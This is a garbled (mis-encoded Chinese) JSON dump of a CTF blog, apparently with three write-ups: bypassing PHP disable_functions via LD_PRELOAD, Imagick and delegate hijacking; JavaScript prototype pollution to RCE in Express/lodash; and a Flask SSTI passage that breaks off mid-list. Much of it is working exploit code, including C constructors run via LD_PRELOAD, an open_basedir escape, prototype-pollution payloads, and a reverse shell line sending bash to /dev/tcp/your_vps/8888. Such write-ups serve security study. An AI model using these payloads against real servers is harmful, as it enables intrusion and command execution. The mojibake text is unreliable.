å³ä½¿æ²¡æœ‰å®‰è£…sendmailä¹Ÿå¯ä»¥RCEï¼Œåˆ é™¤sendmailå¹¶ä¿®æ”¹hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; æ‰€ä»¥å½“æˆ‘ä»¬æœ€å¼€å§‹å°†evil shared library loadä¸Šåï¼Œå°±ä¼šè§¦å‘__attribute__ ((__constructor__)) ï¼Œå³ä½¿åé¢å‡ºç°No such file or dicectory æœ¬é¢˜ä¸­mail()è¢«disable_funcé™åˆ¶ï¼Œæç¤ºphp-imagickæ‰©å±• æºç ï¼šhttps://github.com/ImageMagick/ImageMagick å› ä¸ºçŸ¥é“è¦è°ƒç”¨ffmpegï¼Œgithubæœç´¢å³å¯ Makefile.nt æœç´¢mpeg è¿™é‡Œå¯ä»¥WMVä¸ºä¾‹ a.php 123&lt;?php $img &#x3D; new Imagick(&#39;sky.wmv&#39;);?&gt; ä¹‹åå°±æ˜¯å’Œä¸Šé¢ç±»ä¼¼çš„æŸ¥çœ‹æ˜¯å¦è°ƒç”¨ æ³¨æ„çš„æ˜¯wmvæ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;d4dabdbc73b87e364e29e60c60a92900&#x2F;flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so æœ¬é¢˜ä¸­ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªsky.soå’Œ1.wmvåˆ°/tmp/sandboxä¸‹ æ‰§è¡Œ 12putenv(&quot;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;sky.so&quot;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;1.wmv&#39;); å…¶ä»–è§£æ³•ï¼š ä¸€ã€è¦†ç›–delegate.xml å› ä¸ºæˆ‘ä»¬è¦æ‰§è¡Œ/readflagï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯é€šè¿‡ç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæ—¢ç„¶delagate.xmlé‡Œé¢èƒ½å¤Ÿè‡ªå®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™delegateæ¥è®©imagickå½“å¤„ç†æŸä¸ªæ–‡ä»¶åç¼€æ—¶åŠ è½½æˆ‘ä»¬çš„delegate.xmlï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„commandå³å¯ã€‚ 123&lt;delegatemap&gt; &lt;delegate decode&#x3D;&quot;ps:alpha&quot; command&#x3D;&quot;sh -c &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&quot;&quot;&#x2F;&gt;&lt;&#x2F;delegatemap&gt; å†æ‰§è¡Œ 12putenv(&#39;MAGICK_CONFIGURE_PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); äºŒã€è¦†ç›–å­è¿›ç¨‹ æ¯”ä¸Šä¸€ç§æ›´åŠ æ·±å…¥ä¸€å±‚ åœ¨delegate.xmlå®šä¹‰ä¸­åœ¨decode eptæ–‡ä»¶æ—¶ä¼šè°ƒç”¨gsï¼Œåªè¦æŒ‡å®špathä¸ºæˆ‘ä»¬çš„gsçš„æ–‡ä»¶å¤¹è·¯å¾„å³å¯è¾¾æˆåŠ«æŒçš„æ•ˆæœã€‚ gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd &#x3D; getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; ç¼–è¯‘åå‘½åä¸ºgså³å¯ï¼Œå†ä¸Šä¼ ä¸ª1.ept 1234putenv(&#39;PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);putenv(&#39;CMD&#x3D;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&#39;);chmod(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;gs&#39;,&#39;0777&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); ä¸‰ï¼šåˆ©ç”¨ error_log å‡½æ•°å¯åŠ¨ sendmail è¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ°çš„å°±æ˜¯å½“ error_log çš„ç¬¬äºŒä¸ªå‚æ•° message_type çš„å€¼ä¸º 1 çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨mail å‡½æ•°çš„åŒä¸€ä¸ªå†…ç½®å‡½æ•°(ä¼šæ‰§è¡Œsendmail å‘½ä»¤)çš„ç‰¹æ€§ã€‚ åªéœ€è¦å°†ç¬¬ä¸€ä¸ªmail()ä¾‹å­çš„hack.cä¿®æ”¹æˆå¦‚ä¸‹å³å¯ 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); error_log(&#39;&#39;,1);?&gt; å››ã€ini_setå¯ä»¥ç”¨æ¥ç»•è¿‡open_basedir 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); äº”ã€apache_setenv apache_setenv â€” è®¾ç½® Apache å­è¿›ç¨‹ç¯å¢ƒå˜é‡ å½“è®¾ç½®äº†æŸ Apache ç¯å¢ƒå˜é‡, ç›¸åº”çš„ $_SERVER å˜é‡ä¸ä¼šæ”¹å˜ã€‚ æœäº†ä¸‹å¥½åƒæ²¡æœ‰ç›´æ¥ç›¸å…³çš„æ¼æ´==ï¼ æœ€åæ”¾ä¸Šä¸¤ä¸ªå¸¸ç”¨çš„bypassé“¾æ¥ some exploits in php7 bypass disable_functions via LD_PRELOAD å‚è€ƒé“¾æ¥ https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"JavaScriptåŸå‹é“¾æ±¡æŸ“","slug":"JavaScriptåŸå‹é“¾æ±¡æŸ“","date":"2020-02-25T02:51:11.000Z","updated":"2020-03-25T08:07:12.803Z","comments":true,"path":"2020/02/25/JavaScriptåŸå‹é“¾æ±¡æŸ“/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"è¿™æ¬¡å…¬ç›Šèµ›è€ƒåˆ°äº†JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹å‰çœ‹çš„æ–‡ç« éƒ½æ˜¯çº¸ä¸Šè°ˆå…µï¼ŒèŠ±ç‚¹æ—¶é—´æ¥å­¦ä¹ è®°å½•ä¸‹ã€‚","text":"è¿™æ¬¡å…¬ç›Šèµ›è€ƒåˆ°äº†JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹å‰çœ‹çš„æ–‡ç« éƒ½æ˜¯çº¸ä¸Šè°ˆå…µï¼ŒèŠ±ç‚¹æ—¶é—´æ¥å­¦ä¹ è®°å½•ä¸‹ã€‚ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• åŸç† å…¬ç›Šèµ›Ez epress Codebreaking-thejs æ€»ç»“ å‚è€ƒé“¾æ¥ åŸç†åŸå‹ 123function A(name)&#123; this.name &#x3D; &#39;a&#39;;&#125; åœ¨javascriptä¸­,æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œç›´åˆ°nullä¸ºæ­¢ åœ¨javascriptä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ éƒ½å§‹äºobjectçš„åŸå‹å³object.prototypeã€‚åŒæ—¶ï¼Œåœ¨jsä¸­åªæœ‰ç±»æ‰æœ‰prototypeå±æ€§ï¼Œè€Œå¯¹è±¡å´æ²¡æœ‰ï¼Œå¯¹è±¡æœ‰çš„æ˜¯__proto__å’Œç±»çš„prototypeå¯¹åº”ã€‚ ä¸”äºŒè€…æ˜¯ç­‰ä»·çš„ ç±» æ•°ç»„ ä¸Šé¢å°±æ˜¯ä¸¤æ¡å®Œæ•´çš„åŸå‹é“¾ï¼Œéƒ½ä¼šæŒ‡å‘objectï¼Œå†æŒ‡å‘null å†ä¸¾ä¸ªåŸå‹é“¾æœç´¢çš„ä¾‹å­ 1234567function y()&#123; this.a &#x3D; &#39;a&#39;; this.b &#x3D; &#39;b&#39;;&#125;j &#x3D; new y;y.prototype.c &#x3D; &#39;c&#39;;console.log(j.c) è¿™ä¸ªä¾‹å­ä¸­å…ˆnewäº†ä¸€ä¸ªå¯¹è±¡jï¼Œä¹‹åå†yä¸­æ·»åŠ cï¼Œä½†æ˜¯ä»ç„¶æ‰“å°å‡ºäº†c å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefined å†ä¸¾ä¸ªåŸå‹é“¾æ±¡æŸ“çš„ä¾‹å­ 123456a &#x3D; &#123;&#39;b&#39;:1&#125;console.log(a.b)a.__proto__.b &#x3D; 2console.log(a.b)c &#x3D; &#123;&#125;console.log(c.b) ä¿®æ”¹açš„åŸå‹å³Objectçš„å±æ€§b=2ï¼Œç¬¬ä¸€æ¬¡æ‰“å°a.bæ ¹æ®æœç´¢é¡ºåºä¸ºb=1ï¼Œä¹‹ånewäº†ä¸€ä¸ªå­—å…¸å¯¹è±¡å³Objectï¼Œå› æ­¤å±æ€§b=2 å†ä¸¾ä¸ªåŸå‹é“¾æ±¡æŸ“è§¦å‘çš„ä¾‹å­ 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125;&#125;let o1 &#x3D; &#123;&#125;;let o2 &#x3D; &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 &#x3D; &#123;&#125;;console.log(o3.b); å½“keyä¸º__proto__å³å¯åŸå‹é“¾æ±¡æŸ“ ç†è®ºä¸Šæ‰§è¡Œï¼šo1.a = 1 o1.__proto__.b = 2 è¾“å‡ºåº”è¯¥æ˜¯1ï¼Œ2 å’Œ 2 æ‰§è¡Œä¸€ä¸‹ åŸå› æ˜¯è¿™é‡Œo2 = {a:1,&quot;__proto__&quot;:{b:2}};æ˜¯ç»™o2çš„åŸå‹èµ‹å€¼å±æ€§b=2ï¼Œç›¸å½“äº o2 = {a:1,b:2} è§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ä½¿__proto__ä½œä¸ºé”®å o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejsçš„RCE è°ƒç”¨child_processæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 12global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;) åˆ©ç”¨æ–¹å¼ä¸€èˆ¬æ˜¯objectçš„æŸä¸ªå±æ€§ä¸ºä¸Šé¢çš„æ¨¡å—å¹¶è¢«è°ƒç”¨ ä¸Šé¢éƒ½æ˜¯åŸç†ï¼Œä¸‹é¢åˆ†æå‡ é“é¢˜ å…¬ç›Šèµ›Ez epressregisteréœ€è¦æ»¡è¶³å°å†™ä¸ç­‰äºadminï¼Œä¹‹åtoUpperCase()å­˜å…¥sessionï¼Œå†ä¸ADMINæ¯”è¾ƒ javascriptå¤§å°å†™ç‰¹æ€§ç»•è¿‡ï¼š https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html æˆåŠŸç™»å½•åï¼Œç»§ç»­åˆ†æä»£ç ï¼Œå‘ç° 1234567891011121314151617181920const merge &#x3D; (a, b) &#x3D;&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] &#x3D; b[attr]; &#125; &#125; return a&#125;const clone &#x3D; (a) &#x3D;&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data &#x3D; clone(req.body);router.get(&#39;&#x2F;info&#39;, function (req, res) &#123; res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);&#125;) /actionæ±¡æŸ“åŸå‹é“¾ /infoè§¦å‘æ±¡æŸ“çš„åŸå‹é“¾ è®¾ç½®objectçš„outputFunctionNameçš„å±æ€§ï¼š{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag\\&quot;&#39;);var __tmp2&quot;&#125;&#125; å¤±è´¥äº†ï¼Œå°±æƒ³è°ƒè¯•ä¸‹jsï¼Œæœ¬åœ°æ­å»º 12#å®‰è£…æ¨¡å—npm install å‘ç°æ²¡æœ‰æä¾›ç«¯å£å¯åŠ¨ï¼ŒåŸæ–‡ä»¶æ˜¯åˆ©ç”¨bin/wwwé‡Œé¢å¯åŠ¨çš„ï¼Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æ·»åŠ  1234567&#x2F;&#x2F;ç›‘å¬ç«¯å£ä¸º3000var server &#x3D; app.listen(3000, function () &#123; var host &#x3D; server.address().address; var port &#x3D; server.address().port; console.log(&#39;Example app listening at http:&#x2F;&#x2F;%s:%s&#39;, host, port);&#125;); node --inspect --debug-brk app.jså¯åŠ¨å³å¯åˆ©ç”¨chromeè‡ªå¸¦çš„è°ƒè¯• nodejsè°ƒè¯• æœªmerge()å‰ merge()å çœ‹ä¸‹æºç æ‰æ³¨æ„åˆ°req.session.user.data = clone(req.body); æ˜¯æ•´ä¸ªbodyã€‚ã€‚ã€‚ä¿®æ”¹è¯·æ±‚ä½“å³å¯ ä¹‹å‰çš„payloadå¤±è´¥æ˜¯å› ä¸ºæ²¡æœ‰ç”¨jsonæ ¼å¼å‘é€==ï¼ è®¿é—®/infoè§¦å‘åŸå‹é“¾ï¼Œè®¿é—®/flagä¸‹è½½å³å¯ Codebreaking-thejsserver.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs &#x3D; require(&#39;fs&#39;)const express &#x3D; require(&#39;express&#39;)const bodyParser &#x3D; require(&#39;body-parser&#39;)const lodash &#x3D; require(&#39;lodash&#39;)const session &#x3D; require(&#39;express-session&#39;)const randomize &#x3D; require(&#39;randomatic&#39;)const app &#x3D; express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))app.use(session(&#123; name: &#39;thejs.session&#39;, secret: randomize(&#39;aA0&#39;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine fs.readFile(filePath, (err, content) &#x3D;&gt; &#123; if (err) return callback(new Error(err)) let compiled &#x3D; lodash.template(content) let rendered &#x3D; compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123; let data &#x3D; req.session.data || &#123;language: [], category: []&#125; if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123; data &#x3D; lodash.merge(data, req.body) req.session.data &#x3D; data &#125; res.render(&#39;index&#39;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;)) ä½¿ç”¨ lodash å®ç°äº†ä¸€ä¸ªç®€å•çš„ ejs æ¨¡ç‰ˆå¼•æ“ï¼Œåœ¨è¯·æ±‚çš„æ—¶å€™æ¸²æŸ“ã€‚ lodashè¿™ä¸ªæ¨¡å—æä¾›äº†ä¸¤ä¸ªå·¥å…·lodash.templateå’Œlodash.mergeï¼Œåˆ†åˆ«å¯ç”¨æ¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“å’ŒåŸå‹é“¾è§¦å‘ mergeå°±å¯ä»¥æƒ³åˆ°ä¹‹å‰åˆ†æçš„åŸå‹é“¾æ±¡æŸ“çš„è§¦å‘ç‚¹ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªexpressæ¡†æ¶ï¼Œæ”¯æŒJsonç›´æ¥ä¼ è¾“æ•°æ®ï¼Œå¹¶ä¸”æ¥æ”¶çš„å‚æ•°ä¸ºreq.body lodash.templateçš„æºç  https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result &#x3D; attempt(function() &#123; return Function(importsKeys, sourceURL + &#39;return &#39; + source) .apply(undefined, importsValues);&#125;); è¿½è¸ªsourceURL 1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; å…¶ä¸­ option ä¸ºæˆ‘ä»¬åœ¨æ¨¡ç‰ˆå¼•æ“ä¸­ï¼Œæ¸²æŸ“çš„å€¼ã€‚è¿™é‡Œè¯»å–å…¶ä¸­çš„ sourceURL å±æ€§çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™é‡Œè§¦å‘åŸå‹æ±¡æŸ“ payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e &#x3D;&gt;&#123;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#125;&quot;&#125;&#125;&#125; æ€»ç»“ç®€å•å­¦ä¹ äº†JavaScriptåŸå‹é“¾æ±¡æŸ“çš„åŸç†ä»¥åŠä¸¤é“ç®€å•çš„é¢˜ï¼Œä¸‹ä¸€æ­¥å­¦ä¹ å¯ä»¥æ˜¯ä¸€äº›æºç æ›´åŠ å¤æ‚ï¼Œæˆ–è€…ä¸å…¶ä»–æ¼æ´ç»“åˆåˆ©ç”¨ã€‚ å‚è€ƒé“¾æ¥ https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"flaskæ¨¡ç‰ˆæ³¨å…¥","slug":"flaskæ¨¡ç‰ˆæ³¨å…¥","date":"2020-02-24T01:11:15.000Z","updated":"2020-04-04T15:29:41.217Z","comments":true,"path":"2020/02/24/flaskæ¨¡ç‰ˆæ³¨å…¥/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/","excerpt":"æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹","text":"æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç®€è¿° Python2 Python3 Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰ æ€»ç»“ å‚è€ƒé“¾æ¥ ç®€è¿° æ¼æ´åŸç†å‚è€ƒ æ¼æ´åŸç†ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼šä¸æ­£ç¡®çš„ä½¿ç”¨flaskä¸­çš„render_template_string()å¯¼è‡´çš„SSTIï¼Œå¹¶ä¸”æ¨¡æ¿å†…å®¹ç›´æ¥å—ç”¨æˆ·æ§åˆ¶ è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯å€Ÿflask SSTIå¤ä¹ ä¸‹pythonæ²™ç›’é€ƒé€¸ï¼Œæ•´ç†ä¸‹payloadï¼Œç†è®ºä¸Šä¸åŒæœºå™¨ã€ä¸åŒpythonç‰ˆæœ¬çš„payloadæ˜¯ä¸å°½ç›¸åŒçš„ã€‚ æµ‹è¯•ä»£ç  1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼š flask run --host=0.0.0.0ï¼Œéœ€è¦å¯åŠ¨çš„æ—¶å€™è®¾ç½®hostï¼Œapp.run()ä¸­æ›´æ”¹æ— æ•ˆ python app.pyï¼Œåœ¨app.run()ä¸­è®¾ç½®hostï¼Œåˆ‡æ¢pythonç‰ˆæœ¬æ¯”è¾ƒæ–¹ä¾¿ ç¡®è®¤æ­£å¸¸è®¿é—® å…¨å±€å˜é‡ ,æ¯”è¾ƒå¸¸è§çš„è¯»å–æ˜¯SECRET_KEY æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ æ— è®ºæ˜¯å®ç°æ–‡ä»¶è¯»å–è¿˜æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦åˆ©ç”¨å¯¹è±¡çš„ç»§æ‰¿ï¼Œå…ˆæ‰¾åˆ°çˆ¶ç±»&lt;type &#39;object&#39;&gt;ï¼Œå†å¯»æ‰¾å­ç±»ï¼Œæœ€åæ‰¾åˆ°æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ç›¸åº”æ¨¡å— å‡ ä¸ªè¦ç”¨åˆ°çš„é­”æœ¯æ–¹æ³• 12345678__class__ è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡__mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__base__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»&#x2F;&#x2F; __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__ æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨__init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__ å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ Python2å…ˆæµ‹è¯•Python 2.7.17 éœ€è¦å…ˆé€‰å–ä¸€ä¸ªç±»ï¼Œå‡ ç§å¸¸è§çš„ç±»&#39;&#39;ã€requestã€[]ã€() 1ã€è·å–ç±»å¯¹è±¡ 123456789&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &#39;module&#39;&gt;&gt;&gt;&gt; [].__class__&lt;type &#39;list&#39;&gt;&gt;&gt;&gt; ().__class__&lt;type &#39;tuple&#39;&gt; 2ã€å¯»æ‰¾åŸºç±»object 12345678910111213&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &#39;object&#39;&gt; objectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡__mro__[-1]å¯ä»¥è·å–åˆ° 3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨ 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class 